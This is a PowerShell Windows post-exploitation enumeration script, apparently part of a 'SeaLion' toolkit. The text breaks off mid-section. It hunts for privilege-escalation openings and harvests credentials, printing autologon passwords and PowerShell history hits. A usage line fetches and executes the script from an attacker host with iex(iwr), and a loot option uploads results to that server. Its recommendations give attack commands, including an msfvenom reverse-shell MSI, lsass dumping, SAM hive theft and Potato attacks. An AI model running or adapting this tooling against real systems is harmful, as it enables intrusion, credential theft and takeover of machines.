# WinSeal — Lightweight Windows Enumeration (SeaLion)
# PowerShell 2.0+ compatible, no dependencies, works from cmd.exe and powershell.exe
#
# Usage: winseal.ps1 [-Save] [-OutFile <file>] [-Silent] [-Loot] [-LHost <ip>] [-Help]
#   -Save / -o        Save output to auto-named file (output_N.txt)
#   -OutFile <file>   Save output to specific file
#   -Silent / -s      Silent mode — no terminal output, only write to file
#   -Loot / -l        Upload output to SeaLion loot (/upload)
#   -LHost <ip>      SeaLion server IP (auto-detected if omitted)
#   -Help / -h        Show help
#
# Environment (injected by SeaLion /winseal endpoint):
#   LHOST, SLPORT   SeaLion server address/port
#
# Examples:
#   powershell -ep bypass -File winseal.ps1
#   powershell -ep bypass -File winseal.ps1 -o -l
#   powershell -ep bypass -c "iex(iwr http://LHOST:2727/winseal?ol -UseBasicParsing)"

param(
    [Alias("o")]     [switch]$Save,
    [Alias("f")]     [string]$OutFile = "",
    [Alias("s")]     [switch]$Silent,
    [Alias("l")]     [switch]$Loot,
    [string]$LHost = "",
    [string]$SLPort = "",
    [Alias("h")]     [switch]$Help
)

# ── SeaLion server address (injected by the /winseal endpoint) ─
if (-not $LHost)  { $LHost  = $env:LHOST }
if (-not $SLPort) { $SLPort = $env:SLPORT }

function Show-Usage {
    @'
WinSeal - Lightweight Windows Enumeration (SeaLion)

Usage: winseal.ps1 [OPTIONS]

Options:
  -Save / -o        Save output to auto-named file (output_N.txt)
  -OutFile <file>   Save output to specific file (also -f)
  -Silent / -s      Silent - suppress terminal output (implies save)
  -Loot / -l        Upload output to SeaLion /upload (loot)
  -LHost <ip>      SeaLion server IP (auto-detected if omitted)
  -Help / -h        Show this help

Examples:
  .\winseal.ps1                 # run, print to screen
  .\winseal.ps1 -o              # run + save to output_N.txt
  .\winseal.ps1 -o -l           # run + save + upload to loot
  .\winseal.ps1 -o -s -l        # save + upload, silent
  powershell -ep bypass -c "iex(iwr http://LHOST:2727/winseal?ol -UseBasicParsing)"
'@ | Write-Host
    exit 0
}
if ($Help) { Show-Usage }

# ── Output file resolution ───────────────────────────────────
if ($Save -and -not $OutFile) {
    $n = 1
    while (Test-Path "output_$n.txt") { $n++ }
    $OutFile = "output_$n.txt"
}
if (($Silent -or $Loot) -and -not $OutFile) {
    $n = 1
    while (Test-Path "output_$n.txt") { $n++ }
    $OutFile = "output_$n.txt"
}

# ── Output engine ────────────────────────────────────────────
if ($OutFile) { New-Item -Path $OutFile -ItemType File -Force | Out-Null }

function Emit {
    param([string]$Text, [string]$Color = "White")
    if (-not $Silent) {
        if ($Color -and $Color -ne "White") { Write-Host $Text -ForegroundColor $Color }
        else { Write-Host $Text }
    }
    if ($OutFile) { Add-Content -Path $OutFile -Value $Text -Encoding UTF8 }
}

function Section { param([string]$Name)
    Emit "" "White"
    Emit "===============================================================" "Cyan"
    Emit "  $Name" "Cyan"
    Emit "===============================================================" "Cyan"
    Emit "" "White"
}
function Hi   { param([string]$t) Emit "[!] $t" "Red" }
function Warn { param([string]$t) Emit "[*] $t" "Yellow" }
function Info { param([string]$t) Emit "[+] $t" "Green" }
function Line { param([string]$t) Emit "    $t" "White" }

# Recommendations collector
$script:Recs = New-Object System.Collections.ArrayList
function Rec { param([string]$t) [void]$script:Recs.Add($t) }

# ── Helpers ──────────────────────────────────────────────────
function Get-WmiSafe {
    param([string]$Class, [string]$Filter = "")
    try {
        if ($Filter) { return @(Get-WmiObject -Class $Class -Filter $Filter -ErrorAction Stop) }
        return @(Get-WmiObject -Class $Class -ErrorAction Stop)
    } catch { return @() }
}

# Current identity SIDs (user + groups + well-known)
$script:MySids = @()
try {
    $wi = [Security.Principal.WindowsIdentity]::GetCurrent()
    if ($wi.User) { $script:MySids += $wi.User.Value }
    foreach ($g in $wi.Groups) { $script:MySids += $g.Value }
} catch {}
$script:MySids += @("S-1-1-0", "S-1-5-11", "S-1-5-32-545")  # Everyone, Auth Users, Users

function Test-WriteAccess {
    param([string]$Path)
    if (-not (Test-Path -LiteralPath $Path -ErrorAction SilentlyContinue)) { return $false }
    try { $acl = Get-Acl -LiteralPath $Path -ErrorAction Stop } catch { return $false }
    foreach ($ace in $acl.Access) {
        if ($ace.AccessControlType -ne "Allow") { continue }
        $rights = $ace.FileSystemRights.ToString()
        if ($rights -notmatch "FullControl|Modify|Write|WriteData|CreateFiles|AppendData|268435456|-536805376") { continue }
        $sidStr = $ace.IdentityReference.Value
        try {
            $sid = $ace.IdentityReference.Translate([Security.Principal.SecurityIdentifier]).Value
        } catch { $sid = "" }
        foreach ($known in @("Everyone", "Authenticated Users", "Users", "INTERACTIVE")) {
            if ($sidStr -match [regex]::Escape($known)) { return $true }
        }
        if ($sid -and ($script:MySids -contains $sid)) { return $true }
    }
    return $false
}

function Get-ExeFromCmdLine {
    param([string]$CmdLine)
    if (-not $CmdLine) { return "" }
    $c = $CmdLine.Trim()
    if ($c.StartsWith('"')) {
        $end = $c.IndexOf('"', 1)
        if ($end -gt 1) { return $c.Substring(1, $end - 1) }
    }
    $first = ($c -split '\s+')[0]
    return $first
}

function Resolve-EnvPath {
    param([string]$p)
    if (-not $p) { return "" }
    return [Environment]::ExpandEnvironmentVariables($p)
}

$script:IsAdmin = $false
try {
    $wp = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $script:IsAdmin = $wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
} catch {}

# ══════════════════════════════════════════════════════════════
#                         SCAN START
# ══════════════════════════════════════════════════════════════

Emit "" "White"
Emit "╔══════════════════════════════════════════════╗" "Blue"
Emit "║    WinSeal - Lightweight Windows Enumeration ║" "White"
Emit "║               SeaLion Toolkit                ║" "Green"
Emit "╚══════════════════════════════════════════════╝" "Blue"
Emit "" "White"

if ($OutFile -and -not $Silent) { Info "Output will be saved to: $OutFile" }

# ── SYSTEM INFO ──────────────────────────────────────────────
Section "SYSTEM INFO"

$os = @(Get-WmiSafe Win32_OperatingSystem)[0]
$cs = @(Get-WmiSafe Win32_ComputerSystem)[0]
if ($os) {
    Info "Hostname: $($os.CSName)"
    Info "OS: $($os.Caption) ($($os.OSArchitecture))"
    Info "Version: $($os.Version) - Build $($os.BuildNumber)"
    try {
        $install = [Management.ManagementDateTimeConverter]::ToDateTime($os.InstallDate)
        $lastBoot = [Management.ManagementDateTimeConverter]::ToDateTime($os.LastBootUpTime)
        Info "Install date: $($install.ToString('yyyy-MM-dd'))  |  Last boot: $($lastBoot.ToString('yyyy-MM-dd HH:mm'))"
    } catch {}
    $buildNum = 0
    [void][int]::TryParse($os.BuildNumber, [ref]$buildNum)
    if ($buildNum -gt 0 -and $buildNum -lt 14393) {
        Hi "Old build ($buildNum < 14393) - likely missing many patches, check kernel exploits (MS16-032, MS16-135...)"
        Rec "[PRIVESC] OS build $buildNum is very old -> try MS16-032 / MS16-135 / CVE-2018-8120 depending on SP"
    }
    if ($os.Caption -match "2008|2012|Windows 7|Windows 8(?!\.1)") {
        Hi "Legacy OS detected: $($os.Caption) - check service-pack specific kernel exploits"
        Rec "[PRIVESC] Legacy OS $($os.Caption) -> check MS14-058, MS15-051, MS16-016, MS17-010 (EternalBlue)"
    }
}
$biosSerial = @(Get-WmiSafe Win32_BIOS)[0]
if ($biosSerial -and $biosSerial.SerialNumber -match "VMware|VirtualBox|QEMU|Xen|Virtual") {
    Warn "Virtual machine detected: $($biosSerial.SerialNumber)"
}

# ── HOTFIXES / PATCHES ───────────────────────────────────────
Section "HOTFIXES / PATCH LEVEL"

$hotfixes = @(Get-WmiSafe Win32_QuickFixEngineering)
Info "Installed hotfixes: $($hotfixes.Count)"
if ($hotfixes.Count -gt 0) {
    $sorted = $hotfixes | Sort-Object { $_.InstalledOn } -ErrorAction SilentlyContinue
    $last = $sorted[-1]
    Info "Last hotfix: $($last.HotFixID) ($($last.InstalledOn))"
    try {
        $age = (New-TimeSpan -Start ([datetime]$last.InstalledOn) -End (Get-Date)).Days
        if ($age -gt 365) {
            Hi "System not patched in $age days - likely vulnerable to recent kernel/LPE exploits"
            Rec "[PRIVESC] No patches in $age days -> check exploits released after $($last.InstalledOn) (e.g. PrintNightmare CVE-2021-34527, CVE-2022-26904, HiveNightmare...)"
        } elseif ($age -gt 120) {
            Warn "System not patched in $age days - check for recent LPE exploits"
        }
    } catch {}
} else {
    Hi "No hotfixes found - system may be unpatchable/unpatched!"
    Rec "[PRIVESC] Zero hotfixes -> try kernel exploits matching build number"
}

# ── CURRENT USER & PRIVILEGES ────────────────────────────────
Section "CURRENT USER & PRIVILEGES"

$me = "$env:USERDOMAIN\$env:USERNAME"
Info "User: $me"
if ($script:IsAdmin) {
    Hi "Running as LOCAL ADMIN - if UAC is enabled you may need a UAC bypass; if High Integrity, get SYSTEM via services/tasks"
    Rec "[PRIVESC] Already local admin -> create service (sc create) or scheduled task as SYSTEM, or use token manipulation to get NT AUTHORITY\SYSTEM"
}
try {
    $curId = [Security.Principal.WindowsIdentity]::GetCurrent()
    $curGroups = $curId.Groups | ForEach-Object {
        try { $_.Translate([Security.Principal.NTAccount]).Value } catch { $_.Value }
    }
    Info "Groups: $($curGroups -join ', ')"
} catch {}

$privOut = ""
try { $privOut = (whoami /priv 2>$null | Out-String) } catch {}
if ($privOut) {
    Line ($privOut.Trim())
    if ($privOut -match "SeImpersonatePrivilege\s+.*Enabled") {
        Hi "SeImpersonatePrivilege ENABLED - instant SYSTEM via Potato attacks!"
        Rec "[PRIVESC] SeImpersonatePrivilege enabled -> GodPotato / PrintSpoofer / SweetPotato: 'GodPotato.exe -cmd ""cmd /c whoami""'"
    } elseif ($privOut -match "SeImpersonatePrivilege") {
        Warn "SeImpersonatePrivilege present (disabled) - enable in a process you control, then Potato"
        Rec "[PRIVESC] SeImpersonatePrivilege (disabled) -> run from a process/token that enables it (service accounts have it enabled) then GodPotato/PrintSpoofer"
    }
    if ($privOut -match "SeAssignPrimaryTokenPrivilege") {
        Warn "SeAssignPrimaryTokenPrivilege - usable with potato attacks (Rotten/Juicy)"
    }
    if ($privOut -match "SeDebugPrivilege\s+.*Enabled") {
        Hi "SeDebugPrivilege ENABLED - can read any process memory (lsass) and inject into SYSTEM processes"
        Rec "[PRIVESC] SeDebugPrivilege enabled -> dump lsass (mimikatz/procdump) or inject shellcode into a SYSTEM process (psgetsys)"
    }
    if ($privOut -match "SeBackupPrivilege\s+.*Enabled") {
        Hi "SeBackupPrivilege ENABLED - can read ANY file on disk (SAM/SYSTEM hives, ntds.dit)"
        Rec "[PRIVESC] SeBackupPrivilege enabled -> copy SAM/SYSTEM hives (reg save HKLM\SAM sam) and dump hashes offline"
    }
    if ($privOut -match "SeRestorePrivilege\s+.*Enabled") {
        Hi "SeRestorePrivilege ENABLED - can write ANY file / modify services -> SYSTEM"
        Rec "[PRIVESC] SeRestorePrivilege enabled -> overwrite a SYSTEM service binary or use it to modify registry hives"
    }
    if ($privOut -match "SeTakeOwnershipPrivilege\s+.*Enabled") {
        Hi "SeTakeOwnershipPrivilege ENABLED - take ownership of any file (e.g. SYSTEM service binaries)"
        Rec "[PRIVESC] SeTakeOwnershipPrivilege enabled -> takeown /f <system binary> then replace it with payload"
    }
    if ($privOut -match "SeLoadDriverPrivilege\s+.*Enabled") {
        Hi "SeLoadDriverPrivilege ENABLED - load a vulnerable driver (BYOVD) for kernel code exec"
        Rec "[PRIVESC] SeLoadDriverPrivilege enabled -> BYOVD with a signed vulnerable driver (e.g. via EDRSandblast / loldrivers)"
    }
    if ($privOut -match "SeManageVolumePrivilege") {
        Warn "SeManageVolumePrivilege - can read arbitrary files via volume manipulation"
    }
}
if ($me -match "SYSTEM|NETWORK SERVICE|LOCAL SERVICE|IIS|MSSQL") {
    Hi "Running as a SERVICE account ($me) - almost always has SeImpersonate -> Potato to SYSTEM"
    Rec "[PRIVESC] Service account context -> check SeImpersonatePrivilege above and use GodPotato/PrintSpoofer/SweetPotato"
}

# ── LOCAL USERS & ADMINS ─────────────────────────────────────
Section "LOCAL USERS & ADMINISTRATORS"

$users = @(Get-WmiSafe Win32_UserAccount -Filter "LocalAccount=True")
foreach ($u in $users) {
    $state = if ($u.Disabled) { "disabled" } else { "active" }
    Info "User: $($u.Name) ($state)"
}
try {
    # resolve the local Administrators group by SID (locale-independent)
    $adminGroup = "administrators"
    try { $adminGroup = ([Security.Principal.SecurityIdentifier]"S-1-5-32-544").Translate([Security.Principal.NTAccount]).Value -replace '.*\\', '' } catch {}
    $adminsRaw = @(net localgroup $adminGroup 2>$null)
    Info "Local administrators:"
    $started = $false
    foreach ($line in $adminsRaw) {
        if (-not $started) { if ($line -match '^-{5,}$') { $started = $true }; continue }
        if ($line -match '(?i)complet|successfully|correctamente|orrecto') { break }
        $a = $line.Trim()
        if (-not $a) { continue }
        Line $a
        if ($a -eq $env:USERNAME -and -not $script:IsAdmin) {
            Warn "Current user is in Administrators but token is not elevated (UAC?)"
        }
    }
} catch {}
try {
    $policy = net accounts 2>$null | Out-String
    if ($policy -match "Minimum password length:\s+0") { Warn "Password policy allows EMPTY passwords" }
    if ($policy -match "Lockout threshold:\s+Never") { Info "No lockout threshold - password spraying possible (careful with lockouts anyway)" }
} catch {}

# ── DOMAIN INFO ──────────────────────────────────────────────
Section "DOMAIN INFO"

if ($cs -and $cs.PartOfDomain) {
    Hi "Domain-joined: $($cs.Domain)"
    Info "Logged-on domain: $env:USERDOMAIN"
    try {
        $dc = (nltest /dsgetdc:$($cs.Domain) 2>$null | Out-String).Trim()
        if ($dc) { Line $dc }
    } catch {}
    Rec "[ENUM] Domain-joined host -> run BloodHound/SharpHound, enumerate shares, check for kerberoastable/AS-REP roastable accounts"
} else {
    Info "Not domain-joined (WORKGROUP: $($cs.Workgroup))"
}

# ── NETWORK ──────────────────────────────────────────────────
Section "NETWORK - INTERFACES"

$nets = @(Get-WmiSafe Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True")
foreach ($n in $nets) {
    if ($n.IPAddress) {
        foreach ($ip in $n.IPAddress) {
            if ($ip -notmatch ":") { Info "$($n.Description): $ip" }
        }
    }
    if ($n.DNSServerSearchOrder) { Line "DNS: $($n.DNSServerSearchOrder -join ', ')" }
}

Section "NETWORK - LISTENING PORTS"

$listen = @()
try {
    $listen = @(netstat -ano 2>$null | Select-String "LISTENING" | ForEach-Object {
        $parts = ($_ -replace "\s+", " ").Trim() -split " "
        if ($parts.Count -ge 4) {
            [PSCustomObject]@{ Addr = $parts[1]; PID = $parts[-1] }
        }
    })
} catch {}
$seenPorts = @{}
foreach ($l in $listen) {
    if ($seenPorts.ContainsKey($l.Addr)) { continue }
    $seenPorts[$l.Addr] = $true
    $procName = ""
    try { $procName = (Get-Process -Id ([int]$l.PID) -ErrorAction Stop).ProcessName } catch {}
    $entry = "$($l.Addr)  ->  $procName (pid $($l.PID))"
    if ($l.Addr -match "^127\.0\.0\.1|^\[::1\]") {
        Warn "$entry  (localhost only - possible port-forward target)"
    } else {
        Info $entry
    }
}
$smb = $listen | Where-Object { $_.Addr -match ":445$" }
if ($smb) {
    Rec "[ENUM] SMB listening - check version for EternalBlue (MS17-010) if unpatched: nmap --script smb-vuln-ms17-010"
}

Section "NETWORK - SHARES"

$shares = @(Get-WmiSafe Win32_Share)
foreach ($s in $shares) {
    if ($s.Name -match "^(ADMIN\$|C\$|IPC\$|[A-Z]\$)$") { Info "Share: $($s.Name) -> $($s.Path) (default)" }
    else {
        Warn "Share: $($s.Name) -> $($s.Path) (non-default)"
        Rec "[ENUM] Non-default share $($s.Name) ($($s.Path)) -> check contents for credentials/configs"
    }
}

# ── RUNNING PROCESSES ────────────────────────────────────────
Section "RUNNING PROCESSES (interesting)"

$procs = @(Get-WmiSafe Win32_Process)
$interesting = $procs | Where-Object {
    $_.Name -notmatch "^(svchost|System|smss|csrss|wininit|winlogon|services|lsass|lsm|csrss|dwm|explorer|taskhost|RuntimeBroker|SearchIndexer|spoolsv|conhost|dllhost|WmiPrvSE|MsMpEng|NisSrv|sihost|StartMenuExperienceHost|ShellExperienceHost|fontdrvhost|audiodg|ctfmon|SecurityHealthService|SgrmBroker|Memory Compression|Registry|Idle|System Idle Process)(\..*)?$"
}
foreach ($p in $interesting) {
    $owner = ""
    try {
        $o = $p.GetOwner()
        if ($o.ReturnValue -eq 0) { $owner = "$($o.Domain)\$($o.User)" }
    } catch {}
    $lineStr = "$($p.Name) (pid $($p.ProcessId))"
    if ($owner) { $lineStr += " - $owner" }
    if ($owner -match "SYSTEM|NETWORK SERVICE|LOCAL SERVICE" -and $owner -notmatch "^$([regex]::Escape($me))") {
        Warn $lineStr
    } else { Info $lineStr }
}

# ── SERVICES ─────────────────────────────────────────────────
Section "SERVICES - PRIVESC CHECKS"

$services = @(Get-WmiSafe Win32_Service)
Info "Total services: $($services.Count)"

foreach ($svc in $services) {
    $binRaw = $svc.PathName
    if (-not $binRaw) { continue }
    $isSystem = ($svc.StartName -match "LocalSystem|SYSTEM" -or -not $svc.StartName)
    $tag = if ($isSystem) { " [SYSTEM]" } else { " [$($svc.StartName)]" }

    # 1. Unquoted service path with spaces
    if ($binRaw -notmatch '^\s*"' -and $binRaw -match "\s" -and $binRaw -match "\.exe") {
        $exePart = $binRaw.Trim()
        $isSystem32 = $exePart -match "(?i)^[A-Z]:\\Windows\\System32"
        if (-not $isSystem32) {
            Hi "UNQUOTED SERVICE PATH: $($svc.Name)$tag -> $binRaw"
            Rec "[PRIVESC] Unquoted path in service '$($svc.Name)' ($binRaw) -> plant exe at an intermediate path if any parent dir is writable, then restart service"
        }
    }

    # 2. Writable binary / binary directory
    $exe = Resolve-EnvPath (Get-ExeFromCmdLine $binRaw)
    if ($exe -and (Test-Path -LiteralPath $exe -ErrorAction SilentlyContinue)) {
        if (Test-WriteAccess $exe) {
            Hi "WRITABLE SERVICE BINARY: $($svc.Name)$tag -> $exe"
            Rec "[PRIVESC] Service '$($svc.Name)' binary is writable ($exe) -> replace with payload (msfvenom exe-service), then restart service / reboot"
        } else {
            $dir = Split-Path $exe -Parent
            if ($dir -and (Test-WriteAccess $dir)) {
                Hi "WRITABLE SERVICE DIR: $($svc.Name)$tag -> $dir"
                Rec "[PRIVESC] Directory of service '$($svc.Name)' is writable ($dir) -> DLL hijack or replace binary after rename"
            }
        }
    }

    # 3. Modifiable service registry (service reconfiguration)
    try {
        $rk = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\$($svc.Name)", $true)
        if ($rk) {
            $rk.Close()
            Hi "MODIFIABLE SERVICE REGISTRY: $($svc.Name)$tag (HKLM\...\Services\$($svc.Name))"
            Rec "[PRIVESC] Registry key of service '$($svc.Name)' is writable -> change ImagePath to your payload and restart the service"
        }
    } catch {}
}

# ── SCHEDULED TASKS ──────────────────────────────────────────
Section "SCHEDULED TASKS (as SYSTEM with writable targets)"

$taskOut = @()
try { $taskOut = @(schtasks /query /fo csv /v 2>$null | ConvertFrom-Csv) } catch {}
$checkedTasks = 0
foreach ($t in $taskOut) {
    if ($checkedTasks -ge 400) { break }
    $checkedTasks++
    $runAs = $t."Run As User"
    $taskName = $t.TaskName
    $action = $t."Task To Run"
    if (-not $action -or $action -match "(?i)COM handler|Microsoft\\Windows") { continue }
    if ($runAs -match "SYSTEM|Administrators") {
        $exe = Resolve-EnvPath (Get-ExeFromCmdLine $action)
        if ($exe -and (Test-Path -LiteralPath $exe -ErrorAction SilentlyContinue)) {
            if (Test-WriteAccess $exe) {
                Hi "WRITABLE TASK TARGET: $taskName (runs as $runAs) -> $exe"
                Rec "[PRIVESC] Scheduled task '$taskName' runs as $runAs and its binary is writable ($exe) -> replace and wait for execution (or schtasks /run)"
            }
        }
    }
}
if ($taskOut.Count -eq 0) { Warn "Could not enumerate scheduled tasks (schtasks denied?)" }
else { Info "Tasks checked: $checkedTasks" }

# ── AUTORUNS ─────────────────────────────────────────────────
Section "AUTORUNS (writable targets)"

$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)
foreach ($rk in $runKeys) {
    if (-not (Test-Path $rk)) { continue }
    try {
        $props = Get-ItemProperty -Path $rk -ErrorAction Stop
        $props.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } | ForEach-Object {
            $val = [string]$_.Value
            $exe = Resolve-EnvPath (Get-ExeFromCmdLine $val)
            if ($rk -like "HKLM:*") {
                Info "Autorun (HKLM): $($_.Name) = $val"
                if ($exe -and (Test-Path -LiteralPath $exe -ErrorAction SilentlyContinue) -and (Test-WriteAccess $exe)) {
                    Hi "WRITABLE HKLM AUTORUN TARGET: $exe"
                    Rec "[PRIVESC] Autorun '$($_.Name)' ($exe) is writable and runs at next admin logon -> replace with payload"
                }
            } else {
                Line "Autorun (HKCU): $($_.Name) = $val"
            }
        }
    } catch {}
}

# ── ALWAYSINSTALLELEVATED ────────────────────────────────────
Section "ALWAYSINSTALLELEVATED"

$aie1 = $null; $aie2 = $null
try { $aie1 = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction Stop).AlwaysInstallElevated } catch {}
try { $aie2 = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction Stop).AlwaysInstallElevated } catch {}
if ($aie1 -eq 1 -and $aie2 -eq 1) {
    Hi "AlwaysInstallElevated = 1 (HKLM + HKCU) - MSI packages install as SYSTEM!"
    Rec "[PRIVESC] AlwaysInstallElevated -> msfvenom -f msi -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. > evil.msi ; msiexec /quiet /qn /i evil.msi"
} else {
    Info "AlwaysInstallElevated not enabled (HKLM=$aie1 HKCU=$aie2)"
}

# ── WSUS / WINDOWS UPDATE ────────────────────────────────────
Section "WSUS"

try {
    $wu = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -ErrorAction Stop
    if ($wu.UseWUServer -eq 1) {
        $wsusUrl = ""
        try { $wsusUrl = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction Stop).WUServer } catch {}
        if ($wsusUrl -match "^http://") {
            Hi "WSUS over plain HTTP: $wsusUrl - update injection possible (WSUSpect/SharpWSUS)"
            Rec "[PRIVESC] WSUS HTTP ($wsusUrl) -> ARP-spoof + WSUSpect/SharpWSUS to inject a fake update running as SYSTEM"
        } else {
            Info "WSUS server: $wsusUrl (HTTPS - safer)"
        }
    } else {
        Info "WSUS not in use"
    }
} catch { Info "WSUS not in use" }

# ── SECURITY CONTROLS ────────────────────────────────────────
Section "DEFENSES (AV / UAC / APPLocker / LAPS)"

# Defender
try {
    $def = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender" -ErrorAction SilentlyContinue
    $rtp = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -ErrorAction SilentlyContinue
    if ($def -and $def.DisableAntiSpyware -eq 1) { Hi "Windows Defender DISABLED via registry" }
    if ($rtp -and $rtp.DisableRealtimeMonitoring -eq 1) { Hi "Defender real-time monitoring DISABLED" }
    $mp = $null
    try { $mp = Get-MpPreference -ErrorAction Stop } catch {}
    if ($mp -and $mp.ExclusionPath) {
        Hi "Defender path EXCLUSIONS found:"
        foreach ($ex in $mp.ExclusionPath) {
            Line $ex
            Rec "[EVASION] Defender exclusion: $ex -> drop payloads/tools there"
        }
    }
    Info "Windows Defender present"
} catch {}

# Third-party AV
try {
    $avs = @(Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop)
    foreach ($av in $avs) { Warn "Installed AV: $($av.displayName)" }
} catch {}

# UAC
try {
    $uac = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction Stop
    if ($uac.EnableLUA -eq 0) {
        Hi "UAC DISABLED (EnableLUA=0) - admin = full token, no bypass needed"
        Rec "[PRIVESC] UAC disabled -> if you are in Administrators you already run high-integrity; get SYSTEM via service/task"
    } elseif ($uac.ConsentPromptBehaviorAdmin -eq 0) {
        Hi "UAC auto-elevate without prompt (ConsentPromptBehaviorAdmin=0) - trivial UAC bypass"
        Rec "[PRIVESC] UAC ConsentPromptBehaviorAdmin=0 -> run any elevated binary for silent elevation (e.g. start-process -verb runas)"
    } else {
        Info "UAC enabled (ConsentPromptBehaviorAdmin=$($uac.ConsentPromptBehaviorAdmin))"
    }
    if ($uac.LocalAccountTokenFilterPolicy -eq 1) {
        Hi "LocalAccountTokenFilterPolicy=1 - local admin accounts can authenticate remotely with full token (pass-the-hash friendly)"
        Rec "[LATERAL] LocalAccountTokenFilterPolicy=1 -> PTH/psexec/wmiexec with local admin hash works"
    }
} catch {}

# AppLocker
try {
    $applocker = Get-ChildItem "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2" -ErrorAction Stop
    Hi "AppLocker rules present - check default rules, often bypassable (C:\Windows\Tasks, C:\Windows\Temp, regsvr32, mshta...)"
    Rec "[EVASION] AppLocker present -> check writable-and-executable dirs (C:\Windows\Tasks, C:\Windows\Temp, C:\Windows\tracing) or LOLBins bypass"
} catch { Info "AppLocker not configured" }

# LAPS
if (Test-Path "C:\Program Files\LAPS\CSE\AdmPwd.dll" -ErrorAction SilentlyContinue) {
    Info "LAPS installed - local admin passwords managed in AD (need read rights on ms-Mcs-AdmPwd)"
}

# WDigest
try {
    $wd = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -ErrorAction Stop).UseLogonCredential
    if ($wd -eq 1) {
        Hi "WDigest UseLogonCredential=1 - plaintext credentials cached in LSASS!"
        Rec "[PRIVESC] WDigest enabled -> dump lsass (mimikatz/procdump+comsvcs) for plaintext passwords"
    }
} catch {}

# PowerShell language mode
try {
    $lm = $ExecutionContext.SessionState.LanguageMode
    if ($lm -ne "FullLanguage") {
        Warn "PowerShell LanguageMode: $lm (constrained - AMSI/CLM active)"
        Rec "[EVASION] ConstrainedLanguageMode -> bypass via PSv2 downgrade (powershell -v 2) or in-memory C# compile tricks"
    }
} catch {}

# ── CREDENTIALS & SENSITIVE FILES ────────────────────────────
Section "CREDENTIALS & SENSITIVE FILES"

# Unattend / sysprep
$unattendPaths = @(
    "C:\Windows\Panther\Unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\autounattend.xml",
    "C:\Windows\System32\sysprep\sysprep.xml",
    "C:\Windows\System32\sysprep\sysprep.inf",
    "C:\Windows\System32\sysprep.inf",
    "C:\Windows\unattend.xml",
    "C:\unattend.xml",
    "C:\sysprep.inf"
)
foreach ($p in $unattendPaths) {
    if (Test-Path $p -ErrorAction SilentlyContinue) {
        Hi "UNATTEND FILE: $p - may contain plaintext/base64 admin passwords"
        Rec "[CREDS] $p -> 'type $p | findstr /i password' for plaintext or base64 local admin credentials"
    }
}

# PowerShell history
$histRoots = @()
if ($env:APPDATA) { $histRoots += "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" }
try {
    $userDirs = @(Get-ChildItem "C:\Users" -ErrorAction Stop | Where-Object { $_.PSIsContainer })
    foreach ($ud in $userDirs) {
        $histRoots += "$($ud.FullName)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    }
} catch {}
$histDone = @{}
foreach ($h in $histRoots) {
    if ($histDone.ContainsKey($h)) { continue }
    $histDone[$h] = $true
    if (Test-Path $h -ErrorAction SilentlyContinue) {
        $size = (Get-Item $h).Length
        if ($size -gt 0) {
            Hi "POWERSHELL HISTORY: $h ($size bytes)"
            Rec "[CREDS] $h -> search for passwords/credentials: 'findstr /i ""pass cred secret token key"" $h'"
            try {
                $hits = Select-String -Path $h -Pattern "passw|cred|secret|token|net use|runas|ssh|mysql|psql|rdp" -ErrorAction Stop | Select-Object -First 10
                foreach ($hit in $hits) { Line $hit.Line.Trim() }
            } catch {}
        }
    }
}

# Saved credentials (cmdkey)
try {
    $ck = (cmdkey /list 2>$null | Out-String)
    if ($ck -match "Target:") {
        Hi "SAVED CREDENTIALS in Credential Manager:"
        ($ck -split "`n") | Where-Object { $_ -match "Target:|User:" } | ForEach-Object { Line $_.Trim() }
        Rec "[PRIVESC] Saved credentials (cmdkey /list) -> 'runas /savecred /user:<user> cmd.exe' to run commands as that user"
    }
} catch {}

# Autologon
try {
    $wl = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction Stop
    if ($wl.DefaultPassword) {
        Hi "AUTOLOGON CREDENTIALS: $($wl.DefaultDomainName)\$($wl.DefaultUserName) : $($wl.DefaultPassword)"
        Rec "[CREDS] Autologon password in registry (HKLM\...\Winlogon) -> $($wl.DefaultUserName) : $($wl.DefaultPassword)"
    }
    if ($wl.AutoAdminLogon -eq "1") { Warn "AutoAdminLogon enabled for $($wl.DefaultUserName)" }
} catch {}

# PuTTY saved sessions
try {
    $putty = Get-ChildItem "HKCU:\Software\SimonTatham\PuTTY\Sessions" -ErrorAction Stop
    foreach ($sess in $putty) {
        $sp = Get-ItemProperty $sess.PSPath
        $extra = ""
